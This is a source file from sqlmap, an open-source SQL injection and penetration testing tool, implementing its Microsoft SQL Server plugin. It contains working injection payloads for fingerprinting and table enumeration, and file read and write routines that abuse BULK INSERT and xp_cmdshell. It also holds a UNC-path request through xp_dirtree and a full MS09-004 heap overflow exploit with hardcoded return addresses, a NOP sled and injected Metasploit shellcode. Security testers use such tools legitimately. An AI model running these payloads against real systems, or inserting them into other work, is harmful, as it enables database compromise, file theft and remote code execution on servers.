#!/usr/bin/env python

"""
$Id: mssqlserver.py 1360 2010-03-03 15:26:27Z inquisb $

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2010 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

import binascii
import os
import time

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import getRange
from lib.core.common import posixToNtSlashes
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.convert import urlencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.exception import sqlmapNoneDataException
from lib.core.exception import sqlmapSyntaxException
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.session import setDbms
from lib.core.settings import MSSQL_ALIASES
from lib.core.settings import MSSQL_SYSTEM_DBS
from lib.core.unescaper import unescaper
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.enumeration import Enumeration
from plugins.generic.filesystem import Filesystem
from plugins.generic.fingerprint import Fingerprint
from plugins.generic.misc import Miscellaneous
from plugins.generic.takeover import Takeover


class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
    """
    This class defines Microsoft SQL Server methods
    """

    def __init__(self):
        self.excludeDbsList = MSSQL_SYSTEM_DBS

        Enumeration.__init__(self, "Microsoft SQL Server")
        Filesystem.__init__(self)
        Takeover.__init__(self)

        unescaper.setUnescape(MSSQLServerMap.unescape)

    @staticmethod
    def unescape(expression, quote=True):
        if quote:
            while True:
                index = expression.find("'")
                if index == -1:
                    break

                firstIndex = index + 1
                index = expression[firstIndex:].find("'")

                if index == -1:
                    raise sqlmapSyntaxException("Unenclosed ' in '%s'" % expression)

                lastIndex = firstIndex + index
                old = "'%s'" % expression[firstIndex:lastIndex]
                #unescaped = "("
                unescaped = ""

                for i in range(firstIndex, lastIndex):
                    unescaped += "CHAR(%d)" % (ord(expression[i]))
                    if i < lastIndex - 1:
                        unescaped += "+"

                #unescaped += ")"
                expression = expression.replace(old, unescaped)
        else:
            expression = "+".join("CHAR(%d)" % ord(c) for c in expression)

        return expression

    @staticmethod
    def escape(expression):
        while True:
            index = expression.find("CHAR(")
            if index == -1:
                break

            firstIndex = index
            index = expression[firstIndex:].find("))")

            if index == -1:
                raise sqlmapSyntaxException("Unenclosed ) in '%s'" % expression)

            lastIndex = firstIndex + index + 1
            old = expression[firstIndex:lastIndex]
            oldUpper = old.upper()
            oldUpper = oldUpper.replace("CHAR(", "").replace(")", "")
            oldUpper = oldUpper.split("+")

            escaped = "'%s'" % "".join([chr(int(char)) for char in oldUpper])
            expression = expression.replace(old, escaped)

        return expression

    def getFingerprint(self):
        value = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "
        actVer = formatDBMSfp()

        if not conf.extensiveFp:
            value += actVer
            return value

        blank = " " * 15
        value += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            release = kb.bannerFp["dbmsRelease"] if 'dbmsRelease' in kb.bannerFp else None
            version = kb.bannerFp["dbmsVersion"] if 'dbmsVersion' in kb.bannerFp else None
            servicepack = kb.bannerFp["dbmsServicePack"] if 'dbmsServicePack' in kb.bannerFp else None

            if release and version and servicepack:
                banVer = "Microsoft SQL Server %s " % release
                banVer += "Service Pack %s " % servicepack
                banVer += "version %s" % version

                value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        if conf.dbms in MSSQL_ALIASES and kb.dbmsVersion and kb.dbmsVersion[0].isdigit():
            setDbms("Microsoft SQL Server %s" % kb.dbmsVersion[0])

            self.getBanner()

            if not conf.extensiveFp:
                kb.os = "Windows"

                return True

        infoMsg = "testing Microsoft SQL Server"
        logger.info(infoMsg)

        payload = agent.fullPayload(" AND LEN(@@VERSION)=LEN(@@VERSION)")
        result  = Request.queryPage(payload)

        if result:
            infoMsg = "confirming Microsoft SQL Server"
            logger.info(infoMsg)

            for version in (0, 5, 8):
                randInt = randomInt()
                query   = " AND %d=(SELECT (CASE WHEN (( SUBSTRING((@@VERSION), 22, 1)=2 AND SUBSTRING((@@VERSION), 25, 1)=%d ) OR ( SUBSTRING((@@VERSION), 23, 1)=2 AND SUBSTRING((@@VERSION), 26, 1)=%d )) THEN %d ELSE %d END))" % (randInt, version, version, randInt, (randInt + 1))
                payload = agent.fullPayload(query)
                result  = Request.queryPage(payload)

                if result:
                    if version == 8:
                        kb.dbmsVersion = ["2008"]

                        break

                    elif version == 5:
                        kb.dbmsVersion = ["2005"]

                        break

                    elif version == 0:
                        kb.dbmsVersion = ["2000"]

                        break

                    else:
                        query   = " AND %d=(SELECT (CASE WHEN (SUBSTRING((@@VERSION), 22, 1)=7) THEN %d ELSE %d END))" % (randInt, randInt, (randInt + 1))
                        payload = agent.fullPayload(query)
                        result  = Request.queryPage(payload)

                        if result:
                            kb.dbmsVersion = ["7.0"]

                        break

            if kb.dbmsVersion:
                setDbms("Microsoft SQL Server %s" % kb.dbmsVersion[0])
            else:
                setDbms("Microsoft SQL Server")

            self.getBanner()

            kb.os = "Windows"

            return True
        else:
            warnMsg = "the back-end DMBS is not Microsoft SQL Server"
            logger.warn(warnMsg)

            return False

    def checkDbmsOs(self, detailed=False):
        if kb.os and kb.osVersion and kb.osSP:
            return

        if not kb.os:
            kb.os = "Windows"

        if not detailed:
            return

        infoMsg  = "fingerprinting the back-end DBMS operating system "
        infoMsg += "version and service pack"
        logger.info(infoMsg)

        infoMsg = "the back-end DBMS operating system is %s" % kb.os

        self.createSupportTbl(self.fileTblName, self.tblField, "varchar(1000)")
        inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "@@VERSION"))

        versions = {"2003": ("5.2", (2, 1)),
                    #"2003": ("6.0", (2, 1)),
                    "2008": ("7.0", (1,)),
                    "2000": ("5.0", (4, 3, 2, 1)),
                    "XP": ("5.1", (2, 1)),
                    "NT": ("4.0", (6, 5, 4, 3, 2, 1))}

        # Get back-end DBMS underlying operating system version
        for version, data in versions.items():
            query  =  "(SELECT LEN(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
            query += "LIKE '%Windows NT " + data[0] + "%')>0"
            query  = agent.forgeCaseStatement(query)

            if inject.getValue(query, charsetType=1) == "1":
                kb.osVersion = version
                infoMsg     += " %s" % kb.osVersion

                break

        if not kb.osVersion:
            kb.osVersion = "2003"
            kb.osSP      = 2

            warnMsg  = "unable to fingerprint the underlying operating "
            warnMsg += "system version, assuming it is Windows "
            warnMsg += "%s Service Pack %d" % (kb.osVersion, kb.osSP)
            logger.warn(warnMsg)

            self.cleanup(onlyFileTbl=True)

            return

        # Get back-end DBMS underlying operating system service pack
        sps = versions[kb.osVersion][1]

        for sp in sps:
            query  =  "(SELECT LEN(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
            query += "LIKE '%Service Pack " + str(sp) + "%')>0"
            query  = agent.forgeCaseStatement(query)

            if inject.getValue(query, charsetType=1) == "1":
                kb.osSP = sp
                break

        if not kb.osSP:
            debugMsg = "assuming the operating system has no service pack"
            logger.debug(debugMsg)

            kb.osSP = 0

        if kb.osVersion:
            infoMsg += " Service Pack %d" % kb.osSP

        logger.info(infoMsg)

        self.cleanup(onlyFileTbl=True)

    def getPrivileges(self):
        warnMsg  = "on Microsoft SQL Server it is not possible to fetch "
        warnMsg += "database users privileges"
        logger.warn(warnMsg)

        return {}

    def getTables(self):
        infoMsg = "fetching tables"
        if conf.db:
            infoMsg += " for database '%s'" % conf.db
        logger.info(infoMsg)

        rootQuery = queries[kb.dbms].tables

        if not conf.db:
            if not len(kb.data.cachedDbs):
                dbs = self.getDbs()
            else:
                dbs = kb.data.cachedDbs
        else:
            if "," in conf.db:
                dbs = conf.db.split(",")
            else:
                dbs = [conf.db]

        if kb.unionPosition:
            for db in dbs:
                if conf.excludeSysDbs and db in self.excludeDbsList:
                    infoMsg = "skipping system database '%s'" % db
                    logger.info(infoMsg)

                    continue

                query = rootQuery["inband"]["query"] % db
                value = inject.getValue(query, blind=False)

                if value:
                    kb.data.cachedTables[db] = value

        if not kb.data.cachedTables:
            for db in dbs:
                if conf.excludeSysDbs and db in self.excludeDbsList:
                    infoMsg = "skipping system database '%s'" % db
                    logger.info(infoMsg)

                    continue

                infoMsg  = "fetching number of tables for "
                infoMsg += "database '%s'" % db
                logger.info(infoMsg)

                query = rootQuery["blind"]["count"] % db
                count = inject.getValue(query, inband=False, charsetType=2)

                if not count.isdigit() or not len(count) or count == "0":
                    warnMsg  = "unable to retrieve the number of "
                    warnMsg += "tables for database '%s'" % db
                    logger.warn(warnMsg)
                    continue

                tables = []

                for index in range(int(count)):
                    query = rootQuery["blind"]["query"] % (db, index, db)
                    table = inject.getValue(query, inband=False)
                    tables.append(table)

                if tables:
                    kb.data.cachedTables[db] = tables
                else:
                    warnMsg  = "unable to retrieve the tables "
                    warnMsg += "for database '%s'" % db
                    logger.warn(warnMsg)

        if not kb.data.cachedTables:
            errMsg = "unable to retrieve the tables for any database"
            raise sqlmapNoneDataException(errMsg)

        return kb.data.cachedTables

    def unionReadFile(self, rFile):
        errMsg  = "Microsoft SQL Server does not support file reading "
        errMsg += "with UNION query SQL injection technique"
        raise sqlmapUnsupportedFeatureException(errMsg)

    def stackedReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        result = []
        txtTbl = self.fileTblName
        hexTbl = "%shex" % self.fileTblName

        self.createSupportTbl(txtTbl, self.tblField, "text")
        inject.goStacked("DROP TABLE %s" % hexTbl)
        inject.goStacked("CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)" % (hexTbl, self.tblField, "VARCHAR(4096)"))

        logger.debug("loading the content of file '%s' into support table" % rFile)
        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (txtTbl, rFile, randomStr(10), randomStr(10)), silent=True)

        # Reference: http://support.microsoft.com/kb/104829
        binToHexQuery = """
        DECLARE @charset VARCHAR(16)
        DECLARE @counter INT
        DECLARE @hexstr VARCHAR(4096)
        DECLARE @length INT
        DECLARE @chunk INT

        SET @charset = '0123456789ABCDEF'
        SET @counter = 1
        SET @hexstr = ''
        SET @length = (SELECT DATALENGTH(%s) FROM %s)
        SET @chunk = 1024

        WHILE (@counter <= @length)
        BEGIN
            DECLARE @tempint INT
            DECLARE @firstint INT
            DECLARE @secondint INT

            SET @tempint = CONVERT(INT, (SELECT ASCII(SUBSTRING(%s, @counter, 1)) FROM %s))
            SET @firstint = floor(@tempint/16)
            SET @secondint = @tempint - (@firstint * 16)
            SET @hexstr = @hexstr + SUBSTRING(@charset, @firstint+1, 1) + SUBSTRING(@charset, @secondint+1, 1)

            SET @counter = @counter + 1

            IF @counter %% @chunk = 0
            BEGIN
                INSERT INTO %s(%s) VALUES(@hexstr)
                SET @hexstr = ''
            END
        END

        IF @counter %% (@chunk) != 0
        BEGIN
            INSERT INTO %s(%s) VALUES(@hexstr)
        END
        """ % (self.tblField, txtTbl, self.tblField, txtTbl, hexTbl, self.tblField, hexTbl, self.tblField)

        binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
        binToHexQuery = urlencode(binToHexQuery, convall=True)
        inject.goStacked(binToHexQuery)

        if kb.unionPosition:
            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), sort=False, resumeValue=False, blind=False)

        if not result:
            result = []
            count  = inject.getValue("SELECT COUNT(%s) FROM %s" % (self.tblField, hexTbl), resumeValue=False, charsetType=2)

            if not count.isdigit() or not len(count) or count == "0":
                errMsg  = "unable to retrieve the content of the "
                errMsg += "file '%s'" % rFile
                raise sqlmapNoneDataException(errMsg)

            indexRange = getRange(count)

            for index in indexRange:
                chunk = inject.getValue("SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC" % (self.tblField, hexTbl, self.tblField, index, self.tblField, hexTbl), unpack=False, resumeValue=False, sort=False, charsetType=3)
                result.append(chunk)

        inject.goStacked("DROP TABLE %s" % hexTbl)

        return result

    def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
        errMsg  = "Microsoft SQL Server does not support file upload with "
        errMsg += "UNION query SQL injection technique"
        raise sqlmapUnsupportedFeatureException(errMsg)

    def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
        # NOTE: this is needed here because we use xp_cmdshell extended
        # procedure to write a file on the back-end Microsoft SQL Server
        # file system. Maybe it won't be required to write text files
        self.initEnv()

        self.getRemoteTempPath()

        debugMsg  = "going to use xp_cmdshell extended procedure to write "
        debugMsg += "the %s file content to file '%s'" % (fileType, dFile)
        logger.debug(debugMsg)

        debugSize    = 0xFF00
        tmpPath      = posixToNtSlashes(conf.tmpPath)
        dFileName    = os.path.split(dFile)[1]
        dFile        = posixToNtSlashes(dFile)
        wFileSize    = os.path.getsize(wFile)
        wFilePointer = open(wFile, "rb")
        wFileContent = wFilePointer.read()
        wFilePointer.close()

        if wFileSize < debugSize:
            chunkName = self.updateBinChunk(wFileContent, tmpPath)
            sFile     = "%s\%s" % (tmpPath, dFileName)

            logger.debug("moving binary file %s to %s" % (sFile, dFile))

            commands   = ("cd %s" % tmpPath,
                          "ren %s %s" % (chunkName, dFileName),
                          "move /Y %s %s" % (dFileName, dFile))
            complComm  = " & ".join(command for command in commands)
            forgedCmd  = self.xpCmdshellForgeCmd(complComm)

            self.execCmd(forgedCmd)

        else:
            infoMsg  = "the %s file is bigger than %d " % (fileType, debugSize)
            infoMsg += "bytes. sqlmap will split it into chunks, upload "
            infoMsg += "them and recreate the original file out of the "
            infoMsg += "binary chunks server-side, wait.."
            logger.info(infoMsg)

            counter = 1

            for i in range(0, wFileSize, debugSize):
                wFileChunk = wFileContent[i:i + debugSize]
                chunkName  = self.updateBinChunk(wFileChunk, tmpPath)

                if i == 0:
                    infoMsg = "renaming chunk "
                    copyCmd = "ren %s %s" % (chunkName, dFileName)
                else:
                    infoMsg = "appending chunk "
                    copyCmd = "copy /B /Y %s+%s %s" % (dFileName, chunkName, dFileName)

                infoMsg += "%s\%s to %s\%s" % (tmpPath, chunkName, tmpPath, dFileName)
                logger.debug(infoMsg)

                commands   = ("cd %s" % tmpPath,
                               copyCmd,
                               "del /F %s" % chunkName)
                complComm  = " & ".join(command for command in commands)
                forgedCmd  = self.xpCmdshellForgeCmd(complComm)

                self.execCmd(forgedCmd)

                logger.info("file chunk %d written" % counter)

                counter += 1

            sFile = "%s\%s" % (tmpPath, dFileName)

            logger.debug("moving binary file %s to %s" % (sFile, dFile))

            commands  = ("cd %s" % tmpPath,
                         "move /Y %s %s" % (dFileName, dFile))
            complComm = " & ".join(command for command in commands)
            forgedCmd = self.xpCmdshellForgeCmd(complComm)

            self.execCmd(forgedCmd)

        if confirm:
            self.askCheckWrittenFile(wFile, dFile, fileType)

    def uncPathRequest(self):
        #inject.goStacked("EXEC master..xp_fileexist '%s'" % self.uncPath, silent=True)
        inject.goStacked("EXEC master..xp_dirtree '%s'" % self.uncPath)

    def spHeapOverflow(self):
        """
        References:
        * http://www.microsoft.com/technet/security/bulletin/MS09-004.mspx
        * http://support.microsoft.com/kb/959420
        """

        returns = {
                    # 2003 Service Pack 0
                    "2003-0": (""),

                    # 2003 Service Pack 1
                    "2003-1": ("CHAR(0xab)+CHAR(0x2e)+CHAR(0xe6)+CHAR(0x7c)", "CHAR(0xee)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0xb5)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x13)+CHAR(0xe4)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)", "CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)" ),

                    # 2003 Service Pack 2 updated at 12/2008
                    #"2003-2": ("CHAR(0xe4)+CHAR(0x37)+CHAR(0xea)+CHAR(0x7c)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)", "CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)" ),

                    # 2003 Service Pack 2 updated at 05/2009
                    "2003-2": ("CHAR(0xc3)+CHAR(0xdb)+CHAR(0x67)+CHAR(0x77)", "CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x47)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)")

                    # 2003 Service Pack 2 updated at 09/2009
                    #"2003-2": ("CHAR(0xc3)+CHAR(0xc2)+CHAR(0xed)+CHAR(0x7c)", "CHAR(0xf3)+CHAR(0xd9)+CHAR(0xa7)+CHAR(0x7c)", "CHAR(0x99)+CHAR(0xc8)+CHAR(0x93)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)", "CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)", "CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)"),
                  }
        addrs = None

        for versionSp, data in returns.items():
            version, sp = versionSp.split("-")
            sp          = int(sp)

            if kb.osVersion == version and kb.osSP == sp:
                addrs = data

                break

        if addrs is None:
            errMsg  = "sqlmap can not exploit the stored procedure buffer "
            errMsg += "overflow because it does not have a valid return "
            errMsg += "code for the underlying operating system (Windows "
            errMsg += "%s Service Pack %d)" % (kb.osVersion, kb.osSP)
            raise sqlmapUnsupportedFeatureException(errMsg)

        shellcodeChar = ""
        hexStr        = binascii.hexlify(self.shellcodeString[:-1])

        for hexPair in range(0, len(hexStr), 2):
            shellcodeChar += "CHAR(0x%s)+" % hexStr[hexPair:hexPair+2]

        shellcodeChar = shellcodeChar[:-1]

        self.spExploit = """
        DECLARE @buf NVARCHAR(4000),
        @val NVARCHAR(4),
        @counter INT
        SET @buf = '
        DECLARE @retcode int, @end_offset int, @vb_buffer varbinary, @vb_bufferlen int
        EXEC master.dbo.sp_replwritetovarbin 347, @end_offset output, @vb_buffer output, @vb_bufferlen output,'''
        SET @val = CHAR(0x41)
        SET @counter = 0
        WHILE @counter < 3320
        BEGIN
          SET @counter = @counter + 1
          IF @counter = 411
          BEGIN
            /* pointer to call [ecx+8] */
            SET @buf = @buf + %s

            /* push ebp, pop esp, ret 4 */
            SET @buf = @buf + %s

            /* push ecx, pop esp, pop ebp, retn 8 */
            SET @buf = @buf + %s

            /* Garbage */
            SET @buf = @buf + CHAR(0x51)+CHAR(0x51)+CHAR(0x51)+CHAR(0x51)

            /* retn 1c */
            SET @buf = @buf + %s

            /* retn 1c */
            SET @buf = @buf + %s

            /* anti DEP */
            SET @buf = @buf + %s

            /* jmp esp */
            SET @buf = @buf + %s

            /* jmp esp */
            SET @buf = @buf + %s

            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)

            set @buf = @buf + CHAR(0x64)+CHAR(0x8B)+CHAR(0x25)+CHAR(0x00)+CHAR(0x00)+CHAR(0x00)+CHAR(0x00)
            set @buf = @buf + CHAR(0x8B)+CHAR(0xEC)
            set @buf = @buf + CHAR(0x83)+CHAR(0xEC)+CHAR(0x20)

            /* Metasploit shellcode */
            SET @buf = @buf + %s

            SET @buf = @buf + CHAR(0x6a)+CHAR(0x00)+char(0xc3)
            SET @counter = @counter + 302
            SET @val =  CHAR(0x43)
            CONTINUE
          END
          SET @buf = @buf + @val
        END
        SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''
        EXEC master..sp_executesql @buf
        """ % (addrs[0], addrs[1], addrs[2], addrs[3], addrs[4], addrs[5], addrs[6], addrs[7], shellcodeChar)

        self.spExploit = self.spExploit.replace("    ", "").replace("\n", " ")
        self.spExploit = urlencode(self.spExploit, convall=True)

        logger.info("triggering the buffer overflow vulnerability, wait..")
        inject.goStacked(self.spExploit, silent=True)
